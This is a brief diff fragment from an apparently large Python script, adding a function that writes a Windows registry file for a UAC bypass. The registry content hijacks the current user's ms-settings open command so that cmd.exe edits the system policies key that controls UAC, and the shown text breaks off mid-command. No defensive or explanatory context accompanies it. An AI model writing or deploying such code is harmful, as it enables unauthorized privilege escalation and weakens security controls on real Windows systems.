@@ -7204,4 +7204,9 @@ import os
 import subprocess
 import time
 
-def write_and_import_
+def write_and_import_uac_bypass_reg():
+    reg_content = r'''
+Windows Registry Editor Version 5.00
+
+[HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command]
+@="cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v
